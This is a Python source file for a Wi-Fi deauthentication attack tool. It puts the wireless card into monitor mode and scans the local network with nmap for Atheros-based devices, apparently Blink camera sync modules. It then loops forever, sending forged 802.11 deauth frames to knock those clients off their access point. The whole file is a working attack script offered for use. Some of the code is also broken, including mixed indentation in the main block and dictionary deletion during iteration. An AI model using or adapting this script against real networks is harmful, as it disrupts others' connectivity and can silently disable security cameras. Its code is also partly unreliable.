import sys
import os
import time
import nmap
from scapy.all import *
import argparse
from termcolor import colored
conf.verb = 0

# THANK YOU NETATTACK
def Args():
	parser = argparse.ArgumentParser(usage='''
	 	DEAUTH BLINK SYNC MODULES\n
	   	****IF THE BSSID OR CLIENT MAC IS KNOWN****
	   	-b or --bssid: Bssid of AP to Deauth.
	   	-c or --client: Client Mac address.
	   	''')

	parser.add_argument('-b',
	                    '--bssid',
	                    action='store',
	                    help='''Sets the BSSID of the AP. REQUIRED.\n 
	                    Use airmon-ng or other commands to discover BSSID''',
	                    required=True)
	parser.add_argument('-c',
	                    '--client',
	                    action='store',
	                    help='Sets client to be deathed. NOT REQUIRED. ')
	return parser
    

def deauth(bssid, client):
    while True:
        ap_c_pckt = Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
        if client != 'FF:FF:FF:FF:FF:FF':
            c_ap_pckt = Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth()
        try:
            for x in range(0, 64):
                send(ap_c_pckt)
                if client != 'FF:FF:FF:FF:FF:FF':
                    send(c_ap_pckt)
            print(colored("Sent Packets to {}".format(bssid), "green"))
        except(KeyboardInterrupt):
            print(colored("CYA! Quitting", "cyan"))
            sys.exit(0)


def monitor(status):
    ifaces = os.listdir('/sys/class/net/')
    for iface in ifaces:
        if 'wlan' in iface:
            if status:
                os.system('sudo service network-manager stop')
                os.system('ifconfig ' + iface + ' down')
                os.system('iwconfig ' + iface + ' mode monitor')
                os.system('ifconfig ' + iface + ' up')
                print(colored("Monitor mode enabled", "green"))
            else:
                os.system('sudo service network-manager start')
                os.system('ifconfig ' + iface + ' down')
                os.system('iwconfig ' + iface + ' mode managed')
                os.system('ifconfig ' + iface + ' up')
                print(colored("Monitor mode disabled", "green"))
            return iface


def Scan():
    try:
        nm = nmap.PortScanner()

    except nmap.PortScannerError:
        print('Nmap not found')
        sys.exit(0)
    except:
        print("Unexpected error")
        sys.exit(0)

    print('Starting scan')
    nm.scan(hosts='192.168.1.1/24', arguments='-n -sP -PE -PA21,23,80,3389')
    hosts = {}

    for host in nm.all_hosts():
        if 'mac' in nm[host]['addresses']:
            mac_addr = nm[host]['addresses']['mac']
            if nm[host]['vendor'][mac_addr] == 'Atheros Communications':
                hosts[host] = mac_addr
    for host in hosts:
        nm.scan(host, '53')
        if not nm[host].has_tcp(53):
            del hosts[host]

    print('\n'.join(str(h) + ' is a possible match. The mac address is ' + hosts[h] for h in hosts))	
    if hosts == None:
        print("No hosts found or your network is down. Check and try again")
        sys.exit(0)
    return list(hosts.values())



if __name__ == '__main__':
    args = Args().parse_args()
    try:
        if args.client:
        	conf.iface = monitor(True) #-> set scapy's interface
            os.system('iwconfig wlan0 channel 4')
	        deauth(args.bssid, args.client)
        else:
	        Addrs = Scan()
	        conf.iface = monitor(True) #-> set scapy's interface
	        os.system('iwconfig wlan0 channel 4')
	        for x in Addrs:
	            deauth(args.bssid, x) 
    except:
        print(colored("ERROR: QUITING", "red"))
        monitor(False)
        sys.exit(0)
